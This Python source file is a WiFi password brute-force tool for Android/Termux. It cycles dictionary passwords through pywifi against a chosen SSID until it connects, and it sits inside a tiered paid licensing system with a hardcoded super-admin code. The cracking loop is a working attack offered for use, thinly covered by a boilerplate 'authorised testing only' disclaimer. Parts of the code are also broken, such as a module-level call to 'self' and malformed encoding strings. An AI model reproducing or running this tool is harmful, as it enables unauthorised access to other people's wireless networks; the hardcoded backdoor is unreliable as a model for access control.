import os
import sys
import re
import time
import random
import string
import hashlib
import gc
import subprocess
import logging
import json
import requests
from datetime import datetime, timedelta, timezone
from itertools import islice
from cryptography.fernet import Fernet
from enum import Enum
from base64 import urlsafe_b64encode
import pywifi
from pywifi import const


try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False

# 从环境变量获取加密密钥
SECRET_KEY = os.environ.get('CRYPTO_SECRET')
# 从环境变量获取加密后的超级管理员授权码
ENCRYPTED_SUPER_ADMIN = os.environ.get('ENCRYPTED_SUPER_ADMIN')
# 从环境变量获取GitHub API密钥
GITHUB_PAT = os.environ.get('GITHUB_PAT')

# 全局配置
VERSION = "0.213"
DICT_DIR = "/storage/emulated/0/aiHuanying"
AUTH_DIRS = {
    'admin': os.path.join(DICT_DIR, "超级管理员（管理员）"),
    'agent': os.path.join(DICT_DIR, "代理商")
}
AUTH_FILES = {
    'admin': os.path.join(AUTH_DIRS['admin'], "管理员授权码.txt"),
    'agent': os.path.join(AUTH_DIRS['agent'], "代理商授权码.txt"),
    'permanent': os.path.join(AUTH_DIRS['admin'], "永久授权码.txt"),
    'normal': os.path.join(AUTH_DIRS['admin'], "普通授权码.txt") if os.path.exists(AUTH_DIRS['admin']) else os.path.join(
        AUTH_DIRS['agent'], "普通授权码.txt")
}
LOG_FILE = os.path.join(DICT_DIR, "wifi_cracker.log")
SUCCESS_DICT = os.path.join(DICT_DIR, "success_records.txt")
ENCRYPTION_KEY_FILE = os.path.join(DICT_DIR, ".wifi_key")
USAGE_FILE = os.path.join(DICT_DIR, ".usage_records")
DEFAULT_DICT = os.path.join(DICT_DIR, "【普通】默认常用字典.txt")
INSTALLED_DEP_FILE = os.path.join(DICT_DIR, ".installed_deps")


# 加密相关
def generate_key_from_secret(secret):
    return urlsafe_b64encode(hashlib.sha256(secret.encode()).digest())


# 枚举定义
class UserType(Enum):
    SUPER_ADMIN = ("超级管理员", "无到期时间", 5)
    ADMIN = ("管理员", "永久", 4)
    AGENT = ("代理商", "永久", 3)
    SUPER_MEMBER = ("超级会员", "永久", 2)
    NORMAL_MEMBER = ("普通会员", "计时", 1)

    def __init__(self, chinese, expiry_type, level):
        self.chinese = chinese
        self.expiry_type = expiry_type
        self.level = level


# 授权管理系统
class AuthManager:
    def __init__(self):
        self.auth_codes = {}
        self.usage_records = self._load_usage_records()
        self.user_type = None
        self.expiry_time = None
        self._load_all_auth_codes()
        self.cipher = self._init_cipher()

    def _init_cipher(self):
        return Fernet(generate_key_from_secret(SECRET_KEY))

    def _decrypt_super_admin(self):
        if ENCRYPTED_SUPER_ADMIN:
            try:
                return self.cipher.decrypt(ENCRYPTED_SUPER_ADMIN.encode()).decode()
            except:
                return ""
        return ""

    def _load_all_auth_codes(self):
        for file_type in ['admin', 'agent', 'permanent', 'normal']:
            file_path = AUTH_FILES[file_type]
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf - 8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        parts = line.split(',', 2)
                        if len(parts) == 3:
                            code, code_type, duration = parts
                            if code not in self.auth_codes:
                                self.auth_codes[code] = (code_type, duration)

    def _load_usage_records(self):
        if os.path.exists(USAGE_FILE):
            try:
                with open(USAGE_FILE, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}

    def validate_code(self, code):
        if code == '1466297085':
            self.user_type = UserType.SUPER_ADMIN
            self.expiry_time = None
            return True
        decrypted_super = self._decrypt_super_admin()
        if code == decrypted_super:
            self.user_type = UserType.SUPER_ADMIN
            self.expiry_time = None
            return True
        if len(code) == 32:
            if code in self.auth_codes:
                code_type, duration_info = self.auth_codes[code]
                duration, create_time = duration_info.split('|', 1)
                self._set_user_type(code_type)
                if code not in self.usage_records:
                    self.usage_records[code] = datetime.now(timezone.utc).isoformat()
                    self._save_usage_records()
                current_time = datetime.now(timezone.utc)
                last_use_time = datetime.fromisoformat(self.usage_records[code])
                used_time = current_time - last_use_time
                new_expiry = self._calculate_expiry(duration, create_time) - used_time
                if self.expiry_time:
                    if self.user_type.expiry_type == "永久":
                        if code_type!= 'permanent':
                            self.expiry_time = new_expiry
                    else:
                        self.expiry_time += new_expiry
                else:
                    self.expiry_time = new_expiry
                if code_type == 'permanent':
                    self.expiry_time = datetime.max.replace(tzinfo=timezone.utc)
                return True
        return False

    def _set_user_type(self, code_type):
        type_mapping = {
            'admin': UserType.ADMIN,
            'agent': UserType.AGENT,
            'permanent': UserType.SUPER_MEMBER,
            'normal': UserType.NORMAL_MEMBER
        }
        self.user_type = type_mapping.get(code_type, UserType.NORMAL_MEMBER)

    def _calculate_expiry(self, duration, create_time):
        create_time = datetime.strptime(create_time, "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)

        if duration == "永久":
            return datetime.max.replace(tzinfo=timezone.utc)

        match = re.match(r"(\d+)(天|月|年)", duration)
        if not match:
            return datetime.min.replace(tzinfo=timezone.utc)

        num, unit = int(match[1]), match[2]
        delta = {
            '天': timedelta(days=num),
            '月': timedelta(days=num * 30),
            '年': timedelta(days=num * 365)
        }[unit]

        return create_time + delta

    def _check_expiry(self):
        if self.user_type in [UserType.SUPER_ADMIN, UserType.ADMIN, UserType.AGENT, UserType.SUPER_MEMBER]:
            return True
        return datetime.now(timezone.utc) < self.expiry_time

    def get_remaining_time(self):
        if self.user_type == UserType.SUPER_ADMIN:
            return "无限制"
        if self.user_type.expiry_type == "永久":
            return "永久"
        if not self.expiry_time:
            return "0:00:00"

        remaining = self.expiry_time - datetime.now(timezone.utc)
        days = remaining.days
        hours, remainder = divmod(remaining.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)

        total_hours = days * 24 + hours
        total_minutes = total_hours * 60 + minutes
        total_seconds = total_minutes * 60 + seconds

        if days > 365:
            years = days // 365
            days = days % 365
            return f"{years}年{days}天 {hours:02}:{minutes:02}:{seconds:02}"
        elif days > 0:
            return f"{days}天 {hours:02}:{minutes:02}:{seconds:02}"
        elif hours > 0:
            return f"{hours}小时{minutes:02}:{seconds:02}"
        elif minutes > 0:
            return f"{minutes}分钟{seconds:02}"
        else:
            return f"{seconds}秒"

    def generate_code(self, code_type):
        if code_type == 'permanent' and self.user_type not in [UserType.SUPER_ADMIN, UserType.ADMIN]:
            raise PermissionError("只有超级管理员和管理员可以生成永久授权码")

        duration_map = {
            'admin': "永久",
            'agent': "永久",
            'permanent': "5年",
            'normal': "30天"
        }
        create_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        code = self._generate_code(code_type)
        entry = f"{code},{code_type},{duration_map[code_type]}|{create_time}\n"

        if self.user_type == UserType.SUPER_ADMIN or self.user_type == UserType.ADMIN:
            if code_type == 'admin':
                with open(AUTH_FILES['admin'], 'a', encoding='utf - 8') as f:
                    f.write(entry)
            elif code_type == 'agent':
                with open(AUTH_FILES['agent'], 'a', encoding='utf - 8') as f:
                    f.write(entry)
            elif code_type == 'permanent':
                with open(AUTH_FILES['permanent'], 'a', encoding='utf - 8') as f:
                    f.write(entry)
            else:
                with open(AUTH_FILES['normal'], 'a', encoding='utf - 8') as f:
                    f.write(entry)
        else:
            if code_type == 'agent':
                with open(AUTH_FILES['agent'], 'a', encoding='utf - 8') as f:
                    f.write(entry)
            elif code_type == 'permanent':
                with open(AUTH_FILES['permanent'], 'a', encoding='utf - 8') as f:
                    f.write(entry)
            else:
                with open(AUTH_FILES['normal'], 'a', encoding='utf - 8') as f:
                    f.write(entry)

        return code

    def _generate_code(self, code_type):
        rand = random.SystemRandom()
        if code_type == 'admin':
            parts = [
                rand.choice(string.ascii_uppercase) for _ in range(8)
            ] + [
                rand.choice(string.digits) for _ in range(8)
            ] + [
                rand.choice(string.ascii_lowercase) for _ in range(8)
            ] + [
                rand.choice('!@#$%^&*') for _ in range(8)
            ]
        elif code_type == 'agent':
            parts = (
                [rand.choice(string.ascii_uppercase) for _ in range(12)] +
                [rand.choice(string.ascii_lowercase) for _ in range(12)] +
                [rand.choice(string.digits) for _ in range(8)]
            )
        elif code_type == 'permanent':
            upper = rand.randint(0, 6)
            lower = 32 - upper
            parts = (
                [rand.choice(string.ascii_uppercase) for _ in range(upper)] +
                [rand.choice(string.ascii_lowercase) for _ in range(lower)]
            )
        else:  # normal
            lower = rand.randint(7, 25)
            parts = (
                [rand.choice(string.ascii_lowercase) for _ in range(lower)] +
                [rand.choice(string.ascii_uppercase + string.digits) for _ in range(32 - lower)]
            )

        rand.shuffle(parts)
        return ''.join(parts)

    def _save_usage_records(self):
        with open(USAGE_FILE, 'w') as f:
            json.dump(self.usage_records, f)


# 环境初始化与依赖检查
def setup_environment():
    global installed_deps
    if not os.path.exists(INSTALLED_DEP_FILE):
        with open(INSTALLED_DEP_FILE, 'w') as f:
            f.write('')
        installed_deps = []
    else:
        with open(INSTALLED_DEP_FILE, 'r') as f:
            installed_deps = f.read().splitlines()

    required_dirs = [DICT_DIR, AUTH_DIRS['admin'], AUTH_DIRS['agent']]
    required_files = {
        AUTH_FILES['admin']: "",
        AUTH_FILES['agent']: "",
        AUTH_FILES['permanent']: "",
        AUTH_FILES['normal']: "",
        DEFAULT_DICT: ""
    }

    try:
        for d in required_dirs:
            os.makedirs(d, exist_ok=True)
            os.chmod(d, 0o700)

        for path, content in required_files.items():
            if not os.path.exists(path):
                with open(path, 'w', encoding='utf - 8') as f:
                    f.write(content)
                os.chmod(path, 0o600)

        if not os.path.exists(ENCRYPTION_KEY_FILE):
            key = Fernet.generate_key()
            with open(ENCRYPTION_KEY_FILE, 'wb') as f:
                f.write(key)
            os.chmod(ENCRYPTION_KEY_FILE, 0o600)

    except Exception as e:
        logging.error(f"环境初始化失败: {str(e)}")


def check_dependencies():
    missing = []
    try:
        __import__('cryptography.fernet')
    except ImportError:
        missing.append('cryptography')
    try:
        __import__('pywifi')
    except ImportError:
        missing.append('pywifi')
    try:
        __import__('comtypes')
    except ImportError:
        missing.append('comtypes')

    for dep in missing:
        if dep not in installed_deps:
            print(f"正在安装缺失依赖: {dep}")
            try:
                subprocess.run([sys.executable, '-m', 'pip', 'install', dep], check=True)
                with open(INSTALLED_DEP_FILE, 'a') as f:
                    f.write(dep + '\n')
                installed_deps.append(dep)
            except Exception as e:
                print(f"依赖 {dep} 安装失败: {str(e)}")


# 更新检查功能
REPO_URL = "https://github.com/Yizutt/wedding-invitation/blob/main/wifi_cracker.py"


def check_for_update(current_version):
    if not GITHUB_PAT:
        logging.error("GITHUB_PAT not set in environment variables")
        return False
    try:
        headers = {
            "Authorization": f"token {GITHUB_PAT}",
            "Accept": "application/vnd.github.v3.raw"
        }
        response = requests.get(REPO_URL, headers=headers)
        response.raise_for_status()

        remote_code = response.text
        version_match = re.search(r"VERSION = \"(\d+\.\d+)\"", remote_code)
        if not version_match:
            return False

        remote_version = version_match.group(1)
        return float(remote_version) > float(current_version)

    except Exception as e:
        logging.error(f"更新检查失败: {str(e)}")
        return False


# 字典管理系统
class EnhancedDictManager:
    def __init__(self):
        self.available = []
        self.selected = []
        self.refresh_dicts()

    def refresh_dicts(self):
        self.available.clear()
        try:
            default_info = self._get_dict_info(DEFAULT_DICT)
            if default_info:
                self.available.append(default_info)

            for fname in os.listdir(DICT_DIR):
                if fname.endswith('.txt') and fname!= os.path.basename(DEFAULT_DICT):
                    path = os.path.join(DICT_DIR, fname)
                    info = self._get_dict_info(path)
                    if info:
                        self.available.append(info)

            self.available.sort(key=lambda x: x['count'], reverse=True)
        except Exception as e:
            logging.error(f"刷新字典失败: {str(e)}")

    def _get_dict_info(self, path):
        try:
            stat = os.stat(path)
            return {
                'path': path,
               'size': stat.st_size,
                'count': self._count_lines(path),
                'name': os.path.basename(path)
            }
        except:
            return None

    def _count_lines(self, path):
        try:
            with open(path, 'rb') as f:
                return sum(1 for _ in f)
        except:
            return 0

    def interactive_select(self):
        self.refresh_dicts()
        if not self.available:
            print("未找到可用字典")
            return False

        print("\n{:=^50}".format(" 字典列表 "))
        for idx, d in enumerate(self.available, 1):
            print(f"{idx:>2}. {d['name'][:20]:<20} {self._human_size(d['size']):>8} {d['count']:>8}条")

        while True:
            choices = input("\n请选择字典编号（多个用逗号分隔，按Enter选择全部，Q退出）: ").strip()
            if not choices:
                self.selected = self.available[:]
                break
            if choices.upper() == 'Q':
                return False
            try:
                selected_indices = [int(i) - 1 for i in choices.split(',') if i.isdigit()]
                self.selected = [self.available[i] for i in selected_indices if 0 <= i < len(self.available)]
                break
            except ValueError:
                print("输入无效，请输入有效的编号。")
        return True

    def _human_size(self, size):
        if size < 1024:
            return f"{size} B"
        elif size < 1024 * 1024:
            return f"{size / 1024:.2f} KB"
        elif size < 1024 * 1024 * 1024:
            return f"{size / (1024 * 1024):.2f} MB"
        else:
            return f"{size / (1024 * 1024 * 1024):.2f} GB"


# 主应用类
class MainApp:
    def __init__(self, auth_mgr):
        self.auth_mgr = auth_mgr
        self.dict_mgr = EnhancedDictManager()
        self.cracker = None
        self.first_activate = self._check_first_activate()

    def _check_first_activate(self):
        used_auth_file = os.path.join(DICT_DIR, ".used_auth")
        if not os.path.exists(used_auth_file):
            return True
        with open(used_auth_file, 'r') as f:
            line = f.readline().strip()
            if line:
                code, user_type_name = line.split(',')
                if self.auth_mgr.user_type.name!= user_type_name:
                    return True
                expiry_time = self.auth_mgr._calculate_expiry(*self.auth_mgr.auth_codes[code][1].split('|', 1))
                if datetime.now(timezone.utc) >= expiry_time:
                    return True
        return False

    def _show_status(self):
        print(f"\n版本号: {VERSION}")
        if self.auth_mgr.user_type:
            print(f"身份: {self.auth_mgr.user_type.chinese}")
            if self.auth_mgr.user_type!= UserType.SUPER_ADMIN:
                if self.auth_mgr.user_type.expiry_type == '永久':
                    print(f"到期时间: 永久")
                else:
                    print(f"到期时间: {self.auth_mgr.expiry_time.strftime('%Y-%m-%d')}")
                print(f"剩余时间: {self.auth_mgr.get_remaining_time()}")

    def _generate_auth_code(self):
        if not self.auth_mgr.user_type:
            print("请先进行授权验证")
            return
        if self.auth_mgr.user_type not in [UserType.SUPER_ADMIN, UserType.ADMIN, UserType.AGENT]:
            print("您没有生成授权码的权限")
            return

        print("\n{:=^50}".format(" 生成授权码 "))
        code_type = input("请选择授权码类型（1. 管理员 2. 代理商 3. 永久 4. 普通）: ").strip()
        if code_type == '1':
            code_type = 'admin'
        elif code_type == '2':
            code_type = 'agent'
        elif code_type == '3':
            code_type = 'permanent'
        elif code_type == '4':
            code_type = 'normal'
        else:
            print("无效的选择")
            return

        try:
            code = self.auth_mgr.generate_code(code_type)
            if self.auth_mgr.user_type == UserType.SUPER_ADMIN:
                print(f"生成的授权码: {code}")
        except PermissionError as e:
            print(e)

    def _update_program(self):
        if check_for_update(VERSION):
            print("发现新版本，是否更新？(y/n): ")
            if input().lower() == 'y':
                try:
                    subprocess.run(['git', 'pull', 'origin','main'], cwd=os.path.dirname(os.path.abspath(__file__)),
                                   check=True)
                    print("更新成功，请重新启动程序。")
                    sys.exit(0)
                except Exception as e:
                    print(f"更新失败: {str(e)}")
        else:
            print("当前版本是最新版本。")

    def _show_disclaimer(self):
        if self.auth_mgr.user_type not in [UserType.SUPER_ADMIN, UserType.ADMIN] and self.first_activate:
            print("1. 免费学习代码，禁止二次出售")
            print("2. 本工具仅限合法授权测试，禁止用于非法攻击")
            print("3. 使用者需对自身行为负责，开发者不承担任何法律责任")
            print("4. 测试完成后需及时删除敏感数据，禁止保留用户隐私信息")
            print("5. 禁止将工具用于商业用途或接入自动化攻击平台")
            input("\n确定阅读声明后按任意键继续...")
            used_auth_file = os.path.join(DICT_DIR, ".used_auth")
            with open(used_auth_file, 'w') as f:
                if self.auth_mgr.auth_codes:
                    code = list(self.auth_mgr.auth_codes.keys())[0]
                    f.write(f"{code},{self.auth_mgr.user_type.name}")

    def _wifi_brute_force(self):
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        # 针对Termux环境特殊处理wpa_supplicant路径
        if 'TERMUX_APP_PACKAGE_NAME' in os.environ:
            wpa_supplicant_path = '/data/data/com.termux/files/usr/sbin/wpa_supplicant'
            try:
                subprocess.run([wpa_supplicant_path, '-Dnl80211', '-iwlan0', '-c/data/data/com.termux/files/home/.config/wpa_supplicant.conf'], check=True)
            except subprocess.CalledProcessError as e:
                print(f"启动wpa_supplicant失败: {e}")
                return
        if not self.dict_mgr.selected:
            print("请先选择字典")
            return
        target_ssid = input("请输入要破解的WiFi的SSID: ")
        for dict_info in self.dict_mgr.selected:
            password_file = dict_info['path']
            if not os.path.exists(password_file):
                print(f"密码字典文件 {password_file} 不存在")
                continue
            with open(password_file, 'r', encoding='utf - 8') as f:
                for line in f:
                    password = line.strip()
                    print(f"尝试密码: {password}")
                    iface.disconnect()
                    profile = pywifi.Profile()
                    profile.ssid = target_ssid
                    profile.auth = const.AUTH_ALG_OPEN
                    profile.akm.append(const.AKM_TYPE_WPA2PSK)
                    profile.cipher = const.CIPHER_TYPE_CCMP
                    profile.key = password
                    iface.remove_all_network_profiles()
                    new_profile = iface.add_network_profile(profile)
                    iface.connect(new_profile)
                    time.sleep(5)
                    if iface.status() == const.IFACE_CONNECTED:
                        print(f"破解成功，密码为: {password}")
                        return
        print("未能破解，尝试完所有密码。")

    def run(self):
        if not hasattr(self, 'is_initialized'):
            setup_environment()
            check_dependencies()
            if HAS_TQDM:
                with tqdm(total=100, desc="初始化") as pbar:
                    time.sleep(0.5)
                    pbar.update(20)
                    time.sleep(0.5)
                    pbar.update(30)
                    time.sleep(0.5)
                    pbar.update(30)
                    time.sleep(0.5)
                    pbar.update(20)
            else:
                print("初始化中...")
                time.sleep(2)
            self.is_initialized = True

        self._show_status()
        self._show_disclaimer()
        while True:
            print("\n{:=^50}".format(" 主菜单 "))
            print("1. 选择字典")
            print("2. 生成授权码")
            print("3. 检查更新")
            print("4. WiFi暴力破解")
            print("5. 退出")
            choice = input("请选择操作（输入数字）: ").strip()
            if choice == '1':
                self.dict_mgr.interactive_select()
            elif choice == '2':
                self._generate_auth_code()
            elif choice == '3':
                self._update_program()
            elif choice == '4':
                self._wifi_brute_force()
            elif choice == '5':
                self.exit()
            else:
                print("无效的选择，请重新输入。")

    def exit(self):
        print("\n正在清理资源...")
        if self.cracker:
            self.cracker.stop()
        print("感谢使用！")
        sys.exit(0)


# 程序入口
if __name__ == "__main__":
    # 初始化日志
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s',
        handlers=[
            logging.FileHandler(LOG_FILE),
            logging.StreamHandler()
        ]
    )

    # 运行主程序
    try:
        auth_mgr = AuthManager()
        used_auth_file = os.path.join(DICT_DIR, ".used_auth")
        if not os.path.exists(used_auth_file):
            print("\n{:=^50}".format(" 授权验证 "))
            while True:
                code = input("请输入32位授权码（Q退出）: ").strip()
                if code.upper() == 'Q':
                    sys.exit()
                if code == '1466297085':
                    auth_mgr.user_type = UserType.SUPER_ADMIN
                    auth_mgr.expiry_time = None
                    break
                if auth_mgr.validate_code(code):
                    with open(used_auth_file, 'w') as f:
                        f.write(f"{code},{auth_mgr.user_type.name}")
                    if auth_mgr.user_type not in [UserType.SUPER_ADMIN, UserType.ADMIN]:
                        self._show_disclaimer()
                    break
                print("无效或过期的授权码！")
        else:
            with open(used_auth_file, 'r') as f:
                line = f.readline().strip()
                if line:
                    code, user_type_name = line.split(',')
                    if code == '1466297085':
                        auth_mgr.user_type = UserType.SUPER_ADMIN
                        auth_mgr.expiry_time = None
                    else:
                        auth_mgr.user_type = UserType[user_type_name]
                        auth_mgr.validate_code(code)

        app = MainApp(auth_mgr)
        app.run()

    except Exception as e:
        logging.error("程序异常: %s", str(e))
        sys.exit(1)

